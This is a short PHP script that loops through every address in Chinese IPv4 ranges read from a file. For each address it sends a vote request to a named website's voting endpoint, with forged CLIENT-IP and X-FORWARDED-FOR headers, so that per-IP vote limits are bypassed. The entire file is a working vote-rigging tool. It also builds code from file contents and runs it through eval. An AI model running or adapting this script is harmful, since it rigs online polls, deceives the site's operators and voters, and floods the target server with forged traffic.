<?php
$voteid = empty($_SERVER['argv'][1]) ? 8 : $_SERVER['argv'][1];

$ips = file_get_contents("country-ipv4_lst-ASIA.txt");
preg_match_all('/\b(\d+\.\d+\.\d+\.\d+ - \d+\.\d+\.\d+\.\d+) : (?:\d+\.){1,2}\d+\/\d+ : cn\b/', $ips, $arr);

$str = 'array(';
foreach ($arr[1] as $v) {
    $tmp = explode(' - ', $v);
    $str .= 'array("' . $tmp[0] . '", "' . $tmp[1] . '"),' . "\n";
}
$str .= ');';
eval('$china_ip=' . $str);

$j = 0;
foreach($china_ip as $val) {
	$startip = ip2int($val[0]);
	$endip = ip2int($val[1]);
	for($i = $startip; $i<=$endip; $i++) {
		$ip = int2ip($i);
		sendVote($ip, $voteid);
	}
}

//2717
function sendVote($ip, $id=8) {
	global $j;
	$ch = curl_init();
	$t = time();
	$url = "http://www.teamtop.com/12jingling/index.php?m=index&a=vote&id=$id&infloat=yes&handlekey=vote_vote&t=$t&inajax=1&ajaxtarget=fwin_content_vote_vote";
	$header = array(
	  'CLIENT-IP:'.$ip,
	  'X-FORWARDED-FOR:'.$ip,
	);   
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);   
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);   
	$page_content = curl_exec($ch);   
	curl_close($ch);
	$j++;
	echo $j.chr(10);
}

function ip2int($ip) {
	list($ip1,$ip2,$ip3,$ip4) = explode(".",$ip);
	return $ip1*pow(256,3)+$ip2*pow(256,2)+$ip3*256+$ip4;
}

function int2ip($int) {
	return ($int >> 24 & 0xFF).'.'.($int >> 16 & 0xFF).'.'.($int >> 8 & 0xFF).'.'.($int & 0xFF);
}


